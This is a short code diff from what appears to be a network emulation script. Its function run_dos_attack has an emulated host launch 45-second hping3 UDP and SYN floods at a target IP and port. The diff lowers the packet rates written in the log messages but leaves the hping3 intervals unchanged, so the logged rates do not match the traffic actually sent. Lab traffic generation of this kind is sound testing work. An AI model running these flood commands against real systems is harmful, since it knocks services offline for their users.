@@ -132,13 +132,13 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> {host_log_q}")
 
         # UDP
-        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~3000 duration=45s' >> {host_log_q}")
+        h5.cmd(f"echo '[DOS][LIGHT][UDP] start pps~1500 duration=45s' >> {host_log_q}")
         h5.cmd(
             f"bash -lc 'timeout 45s hping3 --udp -q -p {target_port} -d 120 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
         # SYN
-        h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~2000 duration=45s' >> {host_log_q}")
+        h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~1000 duration=45s' >> {host_log_q}")
         h5.cmd(
             f"bash -lc 'timeout 45s hping3 -S -q -p {target_port} -d 64 -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
         )
